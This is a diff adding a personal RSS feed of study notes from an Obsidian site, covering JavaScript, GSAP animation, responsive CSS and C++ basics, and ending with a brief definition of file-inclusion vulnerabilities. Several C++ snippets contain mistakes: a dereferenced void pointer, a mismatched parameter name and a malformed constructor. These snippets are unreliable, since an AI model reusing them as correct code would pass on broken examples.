@@ -1,0 +1,385 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[VOIDPACKET]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.png</url><title>VOIDPACKET</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 25 Apr 2026 17:29:59 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 25 Apr 2026 17:29:50 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[JavaScript]]></title><description><![CDATA[ if we only have one type of an html element in our HTML document, we can control it just by :
+document.&lt;elementName&gt;
+e.g. : document.body We can update the css style of an element using JS using : &lt;element&gt;.style : // On click we change the display property const revealBtn = document.getElementById('reveal-btn')
+const answer = document.getElementById('answer')
+revealBtn.addEventListener('click', function(){
+&nbsp; &nbsp; answer.style.display = 'block'
+}) Let's say we have the following object :
+const loginCredentials = {
+&nbsp; &nbsp; "rafidhoda": "BestPassword123",
+&nbsp; &nbsp; "shahrukhkhan": "InBigCitiesSmallThingsHappen",
+&nbsp; &nbsp; "jackblack": "ThisIsNotTheGreatestPasswordInTheWorld"
+} We use
+Object.keys(&lt;the object&gt;) // To get only the keys
+Object.values(&lt;the object&gt;) // To get only the values
+Object.entries(&lt;the object&gt;) // To get key value pairs in an array So instead of making a mobile app, we can actually make our web app be a mobile app, they are called Progressive Web App : It looks and feels like a Mobile app This is what we need, a site.webmanifest file that contains : { "name":"", "short_name":"", "icons":[ {"src":"/android-chrome-192x192.png","sizes":"192x192","type":"image/png"},{"src":"/android-chrome-512x512.png","sizes":"512x512","type":"image/png"} ], "theme_color":"#ffffff", "background_color":"#ffffff", "display":"standalone"
+} Alternative of if/else statements (sometimes)
+Syntax : condition ? expression_if_true : expression_if_false const exerciseTimeMins = 20 // let message = ''
+// if (exerciseTimeMins &lt; 30) {
+// &nbsp; &nbsp; message = 'You need to try harder!'
+// }
+// else {
+// &nbsp; &nbsp; message = 'Doing good!'
+// } const message = exerciseTimeMins &lt; 30 ? 'You need to try harder!' : 'Doing good!' For complex conditional logic : It's recommended to stick with if/else Similar to C : it selects one of many code blocks to execute
+Syntax : switch(&lt;thing_to_compare_to&gt;) { case &lt;thing_to_compare_with&gt; : &lt;code_to_execute_if_true&gt; break // to break from the switch case &lt;thing_to_compare_with&gt; : &lt;code_to_execute_if_true&gt; break // and so on default: // This is the case that will be executed if none of the above is executed &lt;code_to_execute_if_true&gt;
+} Enables us to extract properties from objects into distinct variables
+Syntax : const {variables} = &lt;object to destructure&gt;
+const favouriteFilm = {
+&nbsp; &nbsp; title: "Top Gun",
+&nbsp; &nbsp; year: "1986",
+&nbsp; &nbsp; genre: "action",
+&nbsp; &nbsp; star: "Tom Cruise",
+&nbsp; &nbsp; director: "Tony Scott"
+} // we do this
+const {title, year, genre, star, director} = favouriteFilm // instead of this :
+const title = favouriteFilm.title
+const year = favouriteFilm.year
+const genre = favouriteFilm.genre
+const star = favouriteFilm.star
+const director = favouriteFilm.director We can use setTimeout() which executes code after a specified amount of time : setTimeout(&lt;function&gt;, &lt;time in ms&gt;)
+When we have a function that need to take params this is the new syntax : setTimeout(&lt;function&gt;, &lt;time in ms&gt;, &lt;param&gt;) We can stop a setTimeout using clearTimeout const questionTimer = setTimeout(logAnswer, 3000, 'Lima', 10)
+clearTimeout(questionTimer) It repeats executing code every duration, same syntax as setTimeout The Fact: JavaScript is Single-Threaded. It has one "Call Stack." It can only do one thing at a time.
+The Problem: If JS had to wait for a 5-second API call (like your Strava API check), the whole website would freeze.
+The "Friends" (Web APIs): JS doesn't do the heavy waiting itself. It offloads tasks to the Browser (or Node.js runtime). These "friends" include: setTimeout (The Timer)
+fetch (The Network Request) DOM Events (The Click Listener) The Process: Call Stack: JS sees a fetch(). It tells the Browser: "Hey, go get this data, I'm busy."
+Web API: The Browser handles the network request in the background (Multi-tasking!).
+Callback Queue: Once the data is back, the task waits in a "line" (the Queue).
+The Event Loop: This is the "Security Guard." It constantly checks: "Is the Call Stack empty?" * If Yes -&gt; It pushes the next task from the Queue into the Stack. If No -&gt; It waits. To import something (function, array etc.) you have to add export before it, Then in the file where you wanna import it : import { &lt;thing to import&gt; } from '&lt;location&gt;'
+You can change the name of what you wanna import : import { &lt;thing_to_import&gt; as &lt;new_name&gt; } from '&lt;location&gt;'
+To export things all at once of a file use this : export {&lt;thing_to_export&gt;, &lt;thing_to_export&gt;}
+There is another way to export : the default export, in front of what you wanna export add : export default, and to import : same syntax but without {} It allows us to change the name directly of what we exported
+You can have one default export per file ]]></description><link>coding-galaxies/web-dev-galaxy/javascript.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Coding-Galaxies/Web-Dev-Galaxy/JavaScript.md</guid><pubDate>Fri, 24 Apr 2026 19:17:40 GMT</pubDate></item><item><title><![CDATA[GSAP 3 Express]]></title><description><![CDATA[ So before in GSAP we use tweens and timelines, but now we have the gsap objects {} We have 3 methods to create tweens and optionally adding them to a timeline : gsap.to()
+gsap.from()
+gsap.fromTo() So a tween can change a single or multiple properties of a single object or objects over time, so we can do something like this : gsap.to( ".star", {x:750, duration:3} ); which will translate the Object star Something to note is that the tweens have their own playhead : like the one you find in Davinci Resolve etc. and we can inspect where that playhead is at
+A tween allows us to delay the animations of those objects A Timeline is a container for multiple tweens : you can think of it the same way you think as you think of a real Davinci resolve timeline Simple syntax : gsap.to("&lt;target&gt;", {&lt;properties&gt;, &lt;duration&gt;})
+NOTE : if you don't specify the duration it will be set to 500ms = 0.5s For best performance animate CSS transforms and Opacity some of the properties are : x for x translation
+y for y translation
+scale or scaleX, scaleY fill for color
+staggered to delay when the objects connected to the same Tween start animating
+rotation or rotationX, rotationY skewX and skewY GSAP can animate any numeric property you throw at it. width and height
+backgroundColor&nbsp;*hyphenated values need to be camelCase
+color
+padding
+left and top (must set position to relative, absolute, or fixed)
+vh and vw Special properties define how the animation should run and what it should do. Special properties are not animated delay: how much time should transpire before animation begins
+repeat: how many times the animation should repeat
+yoyo: when set to true the animation will play back and forth
+repeatDelay: how much time should transpire between each repeat An animation will&nbsp;repeat indefinitely&nbsp;if you set&nbsp;repeat:-1 We can also control the flow of the animation using Ease : By default the ease is set to : ease out
+To modify we use the keyword : ease: "&lt;type&gt;" ease:”bounce”&nbsp;will bounce on the way out
+ease:”bounce.in” will bounce on the way in
+ease:”bounce.inOut”&nbsp;will bounce on the way in and out
+Some eases can be configured : ease:”back.config(6)”&nbsp;will have a stronger overshoot To customize our ease we use a tool made by GSAP called : <a data-tooltip-position="top" aria-label="https://gsap.com/docs/v3/Eases/?ref=6234" rel="noopener nofollow" class="external-link is-unresolved" href="https://gsap.com/docs/v3/Eases/?ref=6234" target="_self">Ease Visualizer</a> The stagger property allows you to offset the start time of multiple targets in a single tween. In GSAP3 you no longer need the staggerTo(), staggerFrom(), and staggerFromTo() methods of GSAP2. // each image will start 0.2 seconds after the previous one starts.
+gsap.to("#freds img", {y:-100, stagger:0.2}); A stagger object gives you greater control over where the staggers start from and how the timing is dispersed.
+gsap.to("#freds img", {y:-50, stagger:{ each:0.2, from:"end" }
+}); each:0.2&nbsp;means there will be 0.2 seconds&nbsp;between&nbsp;the start of each animation.&nbsp;
+If instead you use&nbsp;amount:0.2&nbsp;then all animations will start&nbsp;within&nbsp;0.2 seconds. to() animates to the properties you set
+from() animates from the properties you set to the default values
+fromTo() allow us to set the starting values and the end values : gsap.fromTo("target", {&lt;starting_values&gt;,&lt;ending_values&gt;})
+If you set a property in the starting_values and not add it's ending version in the ending_values it will not change : it stays fixed, but NOT VICE VERSA So to control a tween we have to reference it by storing it in a variable
+To prevent a tween from playing automatically you can set its&nbsp;paused&nbsp;special property to true.
+var tween = gsap.to("#fred", {x:600, paused:true}); To play that tween you can later call:
+tween.play(); From here you can do something like adding a button and making it so that on click the animation plays
+We have other methods :
+tween.pause()
+tween.reverse()
+tween.restart() It's basically like the Pivot point in Davinci resolve (so the center point where the target will scale on, rotate around and so on) By default DOM elements will scale, spin, and skew around their center point.
+If we want to alter that we have access to the css property transform-origin.&nbsp;
+Like all hyphenated css properties&nbsp;transform-origin&nbsp;becomes&nbsp;transformOrigin&nbsp;when used in a GSAP tween.
+transformOrigin values are set with a pair of&nbsp;horizontal&nbsp;(x) and&nbsp;vertical (y) values as a single string.
+The values are&nbsp;commonly&nbsp;set in&nbsp;pixels,&nbsp;percents, or using the&nbsp;css keywords: left, center, right, top, bottom.
+Syntax : transformOrigin: " &lt;horizontal&gt; &lt;vertical&gt; " So when you're dealing with multiple elements that are animated you most likely want to have them in a timeline : it basically groups them together which will make animating them for example in order very simple because the Timeline will take care of that for you and so on A timeline is created with gsap.timeline() All tweens in a timeline naturally play one after the other. A syntax will look something like this : gsap.timeline() .from("#demo", {autoAlpha:0}) .from("#title", {opacity:0, scale:0, ease:"back"}) .from("#freds img", {y:160, stagger:0.1, duration:0.8, ease:"back"}) .from("#time", {xPercent:100, duration:0.2})
+]]></description><link>coding-galaxies/web-dev-galaxy/gsap/gsap-3-express.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Coding-Galaxies/Web-Dev-Galaxy/GSAP/GSAP 3 Express.md</guid><pubDate>Mon, 13 Apr 2026 18:30:43 GMT</pubDate></item><item><title><![CDATA[Responsive Design]]></title><description><![CDATA[
+We use Relative Units (e.g. em, %) not absolute (e.g. px) When using % on width : the percentage is based on the width of the parent element : this can be helpful when making stuff like progress bar etc.
+% are mostly used with widths We use max-width to set well a max width that the elements won't surpass Similar thing with min-width (it's not commonly used) There is the em unit which is mainly used for Text and it is based to the parent element : 1em is equal to the parent element's font-size value You can think of it like this : &lt;value&gt; * inherited font size If you have a desired size but it's in px you can convert it to em with this formula : desired size (in px) / inherited font-size = desired size (in em) We can also use em with padding and margin and it takes the font-size of that element as a base rem it uses the root size as reference always
+rem are recommended to use more that em line-height doesn't need a specify unit you can simply not use one : line-height = 2; Allow us to modify our layout depending on the width of the screen : mobile, pc, laptop etc.
+Syntax :
+@media ( &lt; width (max or mix) &gt; ) { &lt;CSS properties to apply for that specific width&gt;
+} They're like if statements : if the width of screen is 800px use this CSS
+EXAMPLE :
+@media (min-width: 480px) {
+&nbsp; &nbsp; .section-two-image-container {
+&nbsp; &nbsp; &nbsp; &nbsp; flex-direction: row;
+&nbsp; &nbsp; &nbsp; &nbsp; justify-content: space-between;
+&nbsp; &nbsp; }
+&nbsp; &nbsp; .feature-image {
+&nbsp; &nbsp; &nbsp; &nbsp; width: 48.8%; &nbsp; &nbsp;
+&nbsp; &nbsp; }
+} One of the most used approaches is : Mobile First, which means design for mobile (small screens) first then scale up This is because Mobile users &gt; Desktop users, also it's easier to go from small screens to wider screens in CSS You will need to show content first : NO EXTRA So you might be wondering what sizes i should be targeting in my media queries, there is no standard but here is something : &lt;= 480px
+768px
+1024px = 1280px So what Devs would do is try to resize the layout until they find a layout where something breaks <a data-tooltip-position="top" aria-label="https://developer.chrome.com/docs/devtools/device-mode/" rel="noopener nofollow" class="external-link is-unresolved" href="https://developer.chrome.com/docs/devtools/device-mode/" target="_self">Learn more</a> It is common to set buttons in small screens as a block (taking the whole row) Don't forget to also scale down the font-size This is the most crucial thing to add in your HTML :
+&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; Paste it in the head tag We can have a responsive image grid layout using these flexbox properties : flex-basis : like width sets the original size
+flex-grow EXAMPLE :
+.image-container {
+&nbsp; &nbsp; max-width: 800px;
+&nbsp; &nbsp; line-height: 0;
+&nbsp; &nbsp; margin: 0 auto;
+&nbsp; &nbsp; display: flex;
+&nbsp; &nbsp; flex-wrap: wrap;
+&nbsp; &nbsp; border: 2px solid;
+} .pet-item {
+&nbsp; &nbsp; flex-basis: 220px;
+&nbsp; &nbsp; flex-grow: 1;
+} We also have a shortcut that mixes them both : flex: &lt;grow&gt; &lt;basis&gt; The order of items originally follows the order set in the HTML
+We can use The CSS property order: &lt;number&gt;; to reorder the items within a container HTML -----
+&lt;div class="container"&gt; &lt;div class="item goggles"&gt;🥽&lt;/div&gt; &lt;div class="item tube"&gt;🧪&lt;/div&gt; &lt;div class="item dish"&gt;🧫&lt;/div&gt; &lt;div class="item coat"&gt;🥼&lt;/div&gt;
+&lt;/div&gt; CSS -----
+.coat {
+&nbsp; &nbsp; order: 1;
+}
+.dish {
+&nbsp; &nbsp; order: 2;
+}
+.tube {
+&nbsp; &nbsp; order: 3;
+}
+.goggles {
+&nbsp; &nbsp; order: 4;
+} The default value is 0, you can also use negative values
+-1 to display the item first and 1 displays it last vh is for the height, and vw is for the width
+So it basically sets the height and width according to the user's viewport (the section where the site appears (idk how to explain it))
+NOTE : 1vw = 1% of the viewport width, same for vh ]]></description><link>coding-galaxies/web-dev-galaxy/front-end/responsive-design.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Coding-Galaxies/Web-Dev-Galaxy/Front-End/Responsive Design.md</guid><pubDate>Sat, 28 Mar 2026 17:17:54 GMT</pubDate></item><item><title><![CDATA[C++ - Basics]]></title><description><![CDATA[
+It's an integer (number) that stores a memory address (no matter what data type), that address is what tells us where that specific byte is located in memory.
+int var = 8;
+void* ptr = &amp;var;
+// ptr will hold the address of var
+// pointers gives us the power to access the value of var using derefrencing
+*ptr = 10; // similar to var = 10; Same thing for pointer to pointer : since a pointer is also a variable, it's also stored somewhere in memory, and with pointer to pointer we are storing the address of pointer that holds the address of the variable :
+int** second_ptr = &amp;ptr; They are not your typical variable : they don't take space in memory, and they are similar to a pointer.
+int a = 5;
+int&amp; ref = a; // more complex scenario : Using Refrences
+void Increment(int&amp; value){ value++;
+}
+int main(){ int a = 5; Increment(a);
+} // Using Pointers void Increment(int* value){ (*value)++;
+}
+int main(){ int a = 5; Increment(&amp;a);
+} It's a way to group data and/or functionality together
+// Syntax : remember that class is new type of data
+class &lt;name&gt; {
+}; // exemple : Player in a game &gt;
+class Player {
+public: // this allows us to access these variables (x, y and speed) from anywhere int x, y; int speed;
+}; int main(){ Player player; player.x = 0; // this is how we access those variables
+}
+// variables that are made from class types are called Objects, and a new object variable is called an Instance // exemple : Moving the player &gt;
+class Player {
+public: int x, y; int speed;
+}; void Move(Player&amp; player, int xa, int ya){ // we have passed it as a refrence because we will be modifying the player object player.x += xa * player.speed; player.y += ya * player.speed;
+} int main(){ Player player; Move(player, 1, 2);
+} We can move that Move() function inside the class , and here : functions that are inside classes are called Methods
+// exemple : Moving the player &gt; class Player {
+public: int x, y; int speed; void Move(int xa, int ya){ x += xa * speed; y += ya * speed; }
+}; int main(){ Player player; player.Move(1, 2);
+} This is a cleaner way to write code. The difference between class and struct is almost none : A class is private by default
+A struct is public by default They have the same syntax, and we can use them for the same things
+So THE CHERNO's way of when to use each of them : structs : to handle data
+class : If you'll use inheritance and/or you will need a class full of functionality . It has 2 meanings : one when used inside a struct or class and another when used outside them. Static Outside a Class (The "Invisible" Variable) If you define a variable or a function as static at the top of a .cpp file (global scope), it means: "This variable is private to this file only."
+The Problem: Normally, if you have int x = 5; in FileA.cpp, and you try to create int x = 10; in FileB.cpp, the Linker will scream at you: "Multiple Definition Error! I don't know which 'x' to use!"
+The Fix: If you write static int x = 5;, it tells the linker: "Don't show this 'x' to any other files. Keep it hidden here." Analogy: It's like a "Local Global." It’s global to the file, but invisible to the rest of the project. Static Inside a Class (The "Shared" Variable) This is what you'll use constantly in Godot or Game Dev. If you put static inside a Class, it means: "There is only ONE copy of this variable for the entire Class, no matter how many objects you create."
+Without Static: If you have a Player class and a variable int score, every time you do Player p1; Player p2;, each player has their own separate score.
+With Static: class Player {
+public: static int playerCount; // Shared by ALL players Player() { playerCount++; }
+}; If you create 500 players, there is still only one playerCount in memory. If p1 changes it, it changes for p2 as well. Analogy: It’s like a "Class-wide Bulletin Board." Everyone in the class can see it and change it, but there’s only one board in the room. The "Static Function" Trick :
+A static function inside a class can be called without creating an object. Normal: Player p1; p1.Jump();
+Static: Player::GetTotalPlayers(); (You don't need a p1 to exists to call this). If you're wondering: "If it's shared/hidden, where is it stored?" Static variables are stored in a special part of the memory (the Data Segment), not on the Stack or the Heap. They live for the entire duration of the program. For static variables we can use this naming convention : s_&lt;name&gt; It's a way to give a name to a value, so instead of having int a, b, c; we can just have am enum that has the variables a, b and c An enum is a 4 byte integer Syntax and example :
+enum &lt;name&gt; { A, B, C // these are always integers, and they are set to 0 by default
+}; &gt;&gt;
+enum Example { A, B, C
+}; int main(){ Example value = B; // if we do something like : Example value = 2; we will get an error, we can only use one of the variables inside the enum Example
+} We can specify what data type (but it has to be an int) :
+enum &lt;name&gt; : &lt;type e.g. char&gt; {
+};
+// a char is an int at the end of the day // Game dev example
+enum State { IDLE = 0, RUNNING = 5, JUMPING // JUMPING will automatically become 6
+}; It's a special method that runs when we create a new instance of a class
+It's a class method that allows us to initialize variable to 0, so instead of letting them take what was left from memory when we allocate memory for them, they get set to 0
+It's name must be exactly the name of the class
+The primary use of it is to initialize that class and memory for it
+class Entity {
+public: float x, y; Entity() { // constructor x = 0.0f; y = 0.0f; } void Print(){ std::cout &lt;&lt; x &lt;&lt; "," &lt;&lt; y &lt;&lt; std::endl; }
+}; int main(){ Entity e; e.Print();
+} You can have as many constructors you want, they all must have the same name (It's not an issue), and you can add parameters to those constructors
+class Entity {
+public: float x, y; Entity() { // constructor x = 0.0f; y = 0.0f; } Entity(float X, float Y){ x = X; y = Y; } void Print(){ std::cout &lt;&lt; x &lt;&lt; "," &lt;&lt; y &lt;&lt; std::endl; }
+}; int main(){ Entity e(10.2, 11.47); e.Print();
+} By default C++ applies a default constructor for us, and we can tell the compiler 'no we don't want that constructor' by :
+&lt;constructor_name&gt;() = delete;
+// There are other types of constructors like the move and the copy It runs when we destroy an Object
+constructor for initialization : to set up things for us, and destructor is for termination : it cleans everything that we used It applies for stack and heap objects
+The only difference in syntax is we add ~ in front of the name : ~Entity(){} If we don't use them we can risk memory leaks Destructors are mostly used when you used new in your constructor. If you manually allocated memory on the Heap (new), the destructor is where you must call delete. It's one of the most powerful features of OOP
+It allows us to have a hierarchy of classes which relate to each other : so we can have a base class which have common functionality, and allow us to branch from it and create sub-classes
+It helps so much with code duplication, remember we have to keep our code DRY
+The syntax is pretty straight forward :
+class &lt;sub-class-name&gt; : public &lt;base-class&gt; {
+};
+// Game example
+class Entity {
+public: float X, Y; void Move(float xa, float xy){ X += xa; Y += ya; }
+}; class Player : public Entity { const char* Name; }; int main(){ std::cin.get();
+} here the Player class is not only of type Player but also of type Entity : so both
+Now our sub-class contains everything that our base class has They allow us to overwrite methods in sub-classes : Let's say we have 2 classes : A and B, B is a sub-class of A
+If we have a method in A and we marked it as virtual, we can overwrite it in the B class The syntax : we add the key word virtual in front of the method or function in the main class, and in the sub-class where we overwritten it we mark it with the keyword override as best practice
+They are not free of course : it adds two run times Why we need it: Imagine you have a Shoot() function. A normal gun shoots one bullet, but a Shotgun shoots five. You want to overwrite the normal Shoot() for the Shotgun
+class Weapon {
+public: int ammo = 30; // We add 'virtual' so sub-classes know they are allowed to change this virtual void Shoot() { ammo--; std::cout &lt;&lt; "Pew! 1 bullet fired." &lt;&lt; std::endl; }
+}; class Shotgun : public Weapon {
+public: // We use 'override' just to be safe and clear void Shoot() override { ammo -= 5; std::cout &lt;&lt; "BOOM! 5 bullets fired." &lt;&lt; std::endl; }
+}; int main() { Weapon m4; m4.Shoot(); // Prints: Pew! 1 bullet fired. Shotgun doomStick; doomStick.Shoot(); // Prints: BOOM! 5 bullets fired.
+} It allows us to define a function in a base class that doesn't have an implementation and force sub-classes to implement that function : So these functions don't have code inside them pretty much, they don't do much, and we force every sub-class to have it's own version of that function
+So if the sub-class doesn't implement that function, we can't instantiate the sub-class Why we need it: You want to make an Interactable class for your 2D game. You want Doors to open, and Chests to give loot when the player presses 'E'. You force every interactable object to have an Interact() method, but the base class doesn't do anything itself :
+class Interactable {
+public: // The "= 0" means: "This is pure. I won't write code here. // Any class that inherits me MUST write their own Interact() code." virtual void Interact() = 0; }; class Chest : public Interactable {
+public: void Interact() override { std::cout &lt;&lt; "Chest opened! You got 50 gold." &lt;&lt; std::endl; }
+}; class Door : public Interactable {
+public: void Interact() override { std::cout &lt;&lt; "Door unlocked. Loading next level..." &lt;&lt; std::endl; }
+};
+// If you tried to make a class without Interact(), the compiler would give you an error! It refers to how visible a member or method of a class actually are : so who can call, see and use them
+We have 3 options in C++ : private (the default option in classes) : only the main class
+protected : only the main class and it's subclasses
+public (the default option in structs) : everyone Visibility is not something that really has a use case, it's all about work style. But in Game Dev, it has a massive use case called Encapsulation : Use case: It protects you from yourself. If Player.health is public, any random enemy script can accidentally do player.health = 5000;. If it's private, they have to use player.TakeDamage(10);, which allows you to run death animations or play sounds safely. Syntax is similar to C : &lt;data_type&gt; &lt;name&gt;[size]; &gt; int array[5];
+Arrays are just Pointers An array int arr[5] is basically just a pointer to the first element. The Math: When we do arr[2], C++ is secretly doing: *(arr + 2).
+It knows an int is 4 bytes, so it jumps bytes ahead automatically. The Hack (Pointer Arithmetic): If we turn the pointer into a char* (1 byte), we have to do the math ourselves. *((char*)ptr + 8) is the same as ptr[2]. If I move by bytes (using char*), I have to cast back to (int*) before I dereference. Otherwise, the compiler gets confused about how many bytes I'm trying to write. It's like: Move as a char -&gt; Write as an int. *((int*)((char*)ptr + 8) ) = 6; int array[5]; // created on the stack (will be destroyed as soon as our function ends)
+int* another_arr = new int[5]; // created in the heap (we will have to destroy it ourselves or until the program ends)
+// we can delete it using the delete keyword, and since it's an array we have to add [] &lt;name_of_array&gt;
+delete[] another_arr; Why delete[] and not just delete? When we use new int[5], the compiler stores the size of the array somewhere hidden. When we call delete[], the brackets tell C++: "Go look for that hidden size and call the destructor for every single item in this array." If we forgot the [], it might only delete the first element, leaving the rest as a Memory Leak. So we create it on the Heap when it has to do with lifetime : For example we have a function that returns an array, well here we need to create the array using the new keyword In C++ 11 we have a new version of arrays that allow us to know the size of the array, bounce checking etc. :
+#include &lt;array&gt;
+std::array&lt;&lt;type&gt;, &lt;size&gt;&gt; &lt;name&gt;;
+we can access the size with : &lt;name&gt;.size(); But most game developers still use raw arrays in high-performance code to keep things as fast as possible. In C++ : the standard library has a class called : std::string which is what we'll be using to work with strings.
+But we still can work with strings the same way as C
+Strings are just an array of characters, when we declare a string we are actually declaring it as a pointer : because remember a string is an array and arrays are pointers
+We also have to include the string library if we want to print it out, otherwise the standard library has a definition of it : #include &lt;string&gt;
+So how does it work : std::string name = "voidpacket"; that's it
+We do have methods : name.size();
+name.find(); bool contains = name.find("void") != std::string::npos; If we want to append strings, we can't do it the same way as a high level language (e.g. JS) : std::string name = "void" + "packet"; //this is wrong, because when we declare a sting this way in reality it's a const char which means it can't be modified (same as in JS) What we do is : std::string name = "void"; then name += "packet";
+Or std::string name = std::string("void") + "packet";
+NOTE : If we want to pass a string to a function we don't do : void printString(std::string string){}
+// cause here we are making a copy of that string which will not modify the original one, plus copying a sting will slow our program
+// So what we do is we pass it as CONST REFRENCE (the const is optionel)
+void printString(const std::string&amp; string){} Also string literals are the ones we put inside : "" , but characters inside : '' Strings always end with a Null terminator : \0 If we want to overwrite a char in our string this is how we should declare our string :
+char name[] = "void";
+name[2] = 'y'; and not like this :
+char* name = "void"; // this is because we are trying to overwrite something that's stored in a READ ONLY space in memory
+Also if we want to declare it with a * it's better to add the const :
+const char* name = "void"; // But REMEMBER string literals are always stored in READ ONLY memory We know that char is 1 byte, but there are other types : wchar_t : const wchar_t* name = L"void"; // don't forget to add that L Which takes 2 bytes char16_t : const char16_t* name = u"void"; // don't forget to add that u Which takes 2 bytes, made for utf-16 char32_t : const char32_t* name = U"void"; // don't forget to add that U Which takes 4 bytes, made for utf-32 There is this library, that has some functions to make our lives easier : #include &lt;string&gt; int main(){ using namespace std::string_literals; // now we can do stuff like append strings much easier std::string name = "void"s + "packet"; // see that s } if we wanna work with those other string data types this is how :
+// wchar_t :
+std::wstring name = L"void"s + L"packet";
+// char16_t :
+std::u16string name = u"void"s + u"packet";
+// char32_t :
+std::u32string name = U"void"s + U"packet"; If we want to have multiple lines in our string : we add an R at the beginning of it : const char* para = R"(text_goes_here)"; For more check : <a data-tooltip-position="top" aria-label="https://cplusplus.com/reference/string/string/" rel="noopener nofollow" class="external-link is-unresolved" href="https://cplusplus.com/reference/string/string/" target="_self">cplusplus</a> It's a keyword we use to promise that our variable will always be constant We can break that promise hhhhhhhh and bypass it just in real life (don't do that, Be a man of Honor) Breaking the promise :
+const int MAX_AGE = 90;
+const int* a = new int; // this is similar to this : int const* a = new int
+*a = 2; // THIS WILL GIVE US AN ERROR
+a = (int*)&amp;MAX_AGE; // THIS WON'T GIVE US AN ERROR // so when we declare the const then int* we can make the pointer point somewhere else, but not change it's content AND the exacte opposite happense if we declare int* then const : const int MAX_AGE = 90;
+int* const a = new int; *a = 2; // THIS WON'T GIVE US AN ERROR
+a = (int*)&amp;MAX_AGE; // THIS WILL GIVE US AN ERROR And we can do this : const int* const a = new int which means we can't change the value or make it pointe somewhere else The const Keyword in Classes (The "Read-Only" Promise) When you put const at the end of a class method, you are making a promise to the compiler: "This function will strictly read data. It will absolutely NOT change any variables inside this class."
+Here is exactly how it looks in a Game Dev scenario: class Player {
+private: int health = 100; public: // ❌ NON-CONST: This function modifies the class, so it CANNOT be const. void TakeDamage(int damage) { health -= damage; } // ✅ CONST: This function only reads data. It promises not to touch 'health'. int GetHealth() const { return health; } // If you tried to do `health = 50;` inside GetHealth(), the compiler would throw an error!
+}; Why do we even need this? Look back at the string notes where you wrote: ``` void printString(const std::string&amp; string) I noted that passing by const reference is the best way to avoid slow copies. But here is the catch: When an object is marked as const, you are ONLY allowed to call const methods on it.
+Imagine we write a function to display our player's stats on the screen. To make it fast, we pass the Player by const reference:
+void RenderPlayerStats(const Player&amp; myPlayer) { // This works perfectly because GetHealth() promises not to change anything. int currentHP = myPlayer.GetHealth(); // THIS WILL CRASH THE COMPILER! // myPlayer is const, and TakeDamage is NOT a const method. // The compiler stops you from accidentally breaking your "Man of Honor" promise. myPlayer.TakeDamage(10); } It's a keyword, mostly used inside classes
+Marking a member variable of a class mutable means that we can modify it's value inside const methods
+Another use is with lambdas (still not reached the video on those yet) It's a way for us to initialize class member functions in the constructor
+So when we write a class and we add members to that class, we need a way to initialize them, usually done in the constructor There are 2 ways :
+// 1. Usual way class Entity {
+private: std::string m_Name;
+public: Entity(){ m_Name = "Unknown"; } Entity(const std::string&amp; name){ m_Name = name; } const std::string&amp; GetName() const {return m_Name;}
+}; int main(){ Entity e0; std::cout &lt;&lt; e0.GetName() &lt;&lt; std::endl; Entity e1("Void"); std::cout &lt;&lt; e1.GetName() &lt;&lt; std::endl; std::cin.get();
+}
+// 2. The C++ way class Entity {
+private: std::string m_Name; int m_Score;
+public: Entity() : m_Name("Unknown"), m_Score(0){ // Here is our initializer list } Entity(const std::string&amp; name) : m_Name(name){ } const std::string&amp; GetName() const {return m_Name;}
+}; int main(){ Entity e0; std::cout &lt;&lt; e0.GetName() &lt;&lt; std::endl; Entity e1("Void"); std::cout &lt;&lt; e1.GetName() &lt;&lt; std::endl; std::cin.get();
+} In that list we have to initialize our members in the same order we have declared them as members
+So why would we use it : cause it doesn't look like we did much, 2 reasons : Coding style, this is way cleaner : you can initialize the variables on top and the rest of code inside those {} MOST IMPORTANTLY : if we don't do it this way the member variable will be constructed twice : class Entity {
+private: std::string m_Name; // the first time
+public: Entity(){ m_Name = "Unknown"; // the second time // because this is similar to this : m_Name = std::string("Unkown"); } Similar to JS : condition ? if true : if false; So when we create a class and it's time to use it, we have to instantiate it, we have 2 choices and the difference between them is : Which memory we'll be creating our object in ? SO THE STACK or THE HEAP Stack Allocation :
+#include &lt;iostream&gt;
+#include &lt;string&gt; class Entity {
+private: std::string m_Name;
+public: Entity() : m_Name("Unknown"); Entity(const std::string&amp; name) : m_Name(name) {} const std::string&amp; GetName() const {return m_Name;}
+}; int main(){ // Creating it on the STACK Entity entity; // here it calls the default constructor } So if we can create an object like this, We create the object like this, now here are some when we can't create the object like that : When we want the object to stay ALIVE outside the scope
+The size of the entity is too large or we have multiple entities ... Heap Allocation :
+#include &lt;iostream&gt;
+#include &lt;string&gt; class Entity {
+private: std::string m_Name;
+public: Entity() : m_Name("Unknown"); Entity(const std::string&amp; name) : m_Name(name) {} const std::string&amp; GetName() const {return m_Name;}
+}; int main(){ // Creating it on the HEAP Entity* entity = new Entity; delete entity // we have to free the memory since we used the HEAP
+} So allocating on the STACK is faster than the HEAP, it's easier and whenever we can we use the STACK It's for allocating memory on the HEAP : new &lt;data_type&gt;; new returns a pointer so : int* b = new int; Remember we have to use delete every time after using new
+]]></description><link>coding-galaxies/c-galaxy/c++-basics.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Coding-Galaxies/C-Galaxy/C++ - Basics.md</guid><pubDate>Mon, 16 Mar 2026 15:10:09 GMT</pubDate></item><item><title><![CDATA[Injection-Galaxy]]></title><description><![CDATA[
+Local File Inclusion (LFI) : Allows an attacker to include files that are present in the target's server, it can result in reading sensitive files etc. Remote File Inclusion (RFI) : Allows an attacker to include files from external location, it can lead to code execution etc. Takes input from a user, and using that path to a file without properly validating it :
